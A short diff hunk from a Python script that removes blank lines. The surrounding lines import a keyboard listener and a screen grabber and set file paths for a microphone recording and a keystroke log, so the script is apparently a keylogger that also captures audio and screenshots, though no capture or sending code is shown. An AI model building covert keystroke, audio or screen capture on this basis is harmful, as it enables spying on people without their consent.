@@ -8,9 +8,6 @@ from pynput.keyboard import Key, Listener
 import time
 from PIL import ImageGrab
 
-
-
-
 microphone_time = 10
 audio_information = "data\\aduio.wav"
 key_information = "data\\key_log.txt"
